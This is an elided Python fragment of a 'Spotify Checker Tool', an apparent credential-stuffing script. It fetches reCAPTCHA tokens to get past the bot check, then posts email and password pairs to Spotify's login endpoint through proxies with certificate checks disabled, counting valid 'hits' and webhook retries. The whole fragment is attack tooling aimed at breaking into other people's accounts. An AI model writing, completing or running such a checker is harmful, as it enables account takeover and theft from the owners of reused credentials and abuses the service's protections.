...
class Main:
    ...
    def TitleUpdate(self):
        while True:
            self.SetTitle(f'[One Man Builds Spotify Checker Tool] ^| HITS: {self.hits} ^| BADS: {self.bads} ^| WEBHOOK RETRIES: {self.webhook_retries} ^| RETRIES: {self.retries} ^| THREADS: {active_count()-1}')
            sleep(0.1)
    ...
    def find_string_between(self,string,first, last ):
        try:
            ...
            self.retries += 1
            self.find_string_between(string,first,last)
    ...
    def Spotify(self,email,password):
        try:
            ...
            response = requests.get(recaptcha_link,headers=recaptcha_headers,proxies=proxy)
            ...
            response = requests.post(f'https://www.google.com/recaptcha/api2/reload?k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&v=iSHzt4kCrNgSxGUYDFqaZAL9&reason=q&c={recaptcha_token}', headers=google_nid_headers,proxies=proxy)
            ...
            response = requests.get('https://accounts.spotify.com/en/login',headers=grab_headers,proxies=proxy,verify=False,timeout=2)
            ...
            response = requests.post('https://accounts.spotify.com/login/password',headers=check_headers ,data=body,proxies=proxy,verify=False,timeout=2)
